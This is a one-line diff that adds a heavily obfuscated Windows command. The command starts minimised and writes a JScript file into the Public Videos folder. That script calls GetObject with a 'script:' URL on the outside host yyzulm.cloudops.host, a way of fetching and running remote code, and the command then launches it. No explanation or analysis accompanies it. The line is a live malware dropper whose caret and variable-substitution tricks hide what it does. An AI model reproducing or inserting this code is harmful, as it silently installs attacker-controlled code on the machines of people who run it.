@@ -1,0 +1,1 @@
+start /MIN %ComSpec% /V/D/c "s^eT HLTX=^еж^зи^й╗&&se^T UNYT=%Public%\V^id^eos\^ZbqYs1&&Se^^t TBZFPH=tr^y^{^vVuvar c='sc^ri^pt^:';d='hVuvTt^P:';GVuvet^Ob^jVuvec^t(c+d+'&&se^T VCAL=KofF3KofF3yyzulm.cloudops.hostKofF3?1KofF3');}c^a^tch^(e^){^}^;&&s^eT/^p SCKWG="!TBZFPH:Vuv=!!VCAL:KofF3=/!"<n^ul > !UNYT!.^j^S|ca^l^l s^t^a^rt !UNYT!.j^S "|c^M^d
